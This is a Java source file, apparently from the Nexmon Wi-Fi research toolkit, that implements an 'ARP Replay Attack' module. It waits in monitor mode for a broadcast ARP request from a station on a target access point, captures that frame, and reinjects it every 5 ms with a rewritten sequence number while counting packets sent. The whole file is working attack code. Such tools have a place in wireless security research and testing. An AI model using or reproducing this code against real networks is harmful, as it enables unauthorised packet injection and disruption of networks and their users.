package de.tu_darmstadt.seemoo.nexmon.stations;



import de.tu_darmstadt.seemoo.nexmon.DissectionStrings;
import de.tu_darmstadt.seemoo.nexmon.MyApplication;
import de.tu_darmstadt.seemoo.nexmon.net.FrameSender;
import de.tu_darmstadt.seemoo.nexmon.net.IFrameReceiver;
import de.tu_darmstadt.seemoo.nexmon.sharky.Packet;

/**
 * Created by fabian on 9/15/16.
 */
public class ArpReplayAttack extends Attack implements IFrameReceiver {

    private String stationMac;
    private boolean useCustomStationMac;
    private String arpFile;
    private boolean useArpFile;
    private byte[] arpData;
    private int seqNum = 0;
    private int sendCounter = 0;

    public ArpReplayAttack(AccessPoint ap, String stationMac, boolean useCustomStationMac, String arpFile, boolean useArpFile) {
        super(ap);
        this.stationMac = stationMac;
        this.arpFile = arpFile;
        this.useCustomStationMac = useCustomStationMac;
        this.useArpFile = useArpFile;
    }

    @Override
    public String getName() {
        return "ARP Replay Attack";
    }

    @Override
    public String getTypeString() {
        return ATTACK_ARP_REPLAY;
    }

    @Override
    public boolean needsMonitorMode() {
        return true;
    }

    @Override
    public void stopAttack() {
        super.stopAttack();
    }

    @Override
    public int getMaxInstances() {
        return 9;
    }

    @Override
    public void doAttack() {
        //arpreplay("wlan0", getAp().getBssid(), useCustomStationMac, stationMac, useArpFile, arpFile, getGuid());
        MyApplication.getFrameReceiver().getObserver().addObserver(this);
        String info = "Waiting for ARP request...\n";
        updateAttackText(info, AttackInfoString.ATTACK_UPDATE_RUNNING, getGuid());
        while(!isCanceled) {
            if(arpData != null) {
                seqNum++;

                int seqNumNew = (seqNum << 4) & 0xFFF0;
                arpData[52] = (byte) (seqNumNew & 0xFF);
                arpData[53] = (byte) (seqNumNew >> 8);

                FrameSender.sendViaSocket(arpData);
                sendCounter++;
                if(sendCounter % 500 == 0) {
                    arpReplayUpdateStats(sendCounter);
                }
                try {
                    Thread.sleep(5);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
        }
        MyApplication.getFrameReceiver().getObserver().removeObserver(this);
    }


    public void arpReplayUpdateStats(int sentPackets) {

        String info = "\n" + DELIMITER + "\n";
        info += "Packets sent: " + sentPackets + "\n";
        info += DELIMITER + "\n";

        updateAttackText(info, AttackInfoString.ATTACK_UPDATE_SUCCESS, getGuid());

    }

    @Override
    public void packetReceived(Packet packet) {

        while(!Packet.blocked.compareAndSet(false, true))
            try {
                Thread.sleep(1);
            } catch(Exception e) {e.printStackTrace();}

            if(arpData == null && isArpRequest(packet)) {
                String info = "ARP Request Received!\n";
                updateAttackText(info, AttackInfoString.ATTACK_UPDATE_SUCCESS, getGuid());

                arpData = new byte[packet._dataLen - 4];
                for(int i = 0; i < arpData.length; i++) {
                    arpData[i] = packet._rawData[i];
                }
            }


        packet.cleanDissection();
        Packet.blocked.set(false);
    }

    private boolean isArpRequest(Packet packet) {
        int len = 0;
        String bssid;
        String client;
        String dest;
        String seq;
        String lenString = packet.getField(DissectionStrings.DISS_DATA_LENGTH);

        if(lenString == null || lenString.isEmpty())
            return false;

        len = Integer.valueOf(lenString);

        if(len != 36)
            return false;

        seq = packet.getField(DissectionStrings.DISS_SEQ);
        bssid = packet.getField(DissectionStrings.DISS_BSSID);
        client = packet.getField(DissectionStrings.DISS_SRC_ADDR);
        dest = packet.getField(DissectionStrings.DISS_DST_ADDR);

        if(seq == null || bssid == null || client == null || dest == null)
            return false;

        seqNum = Integer.valueOf(seq);

        if(!bssid.equals(getAp().getBssid()))
            return false;

        if(!getAp().getStations().containsKey(client))
            return false;

        if(!dest.equals("ff:ff:ff:ff:ff:ff"))
            return false;

        MyApplication.getFrameReceiver().getObserver().removeObserver(this);
        return true;
    }
}
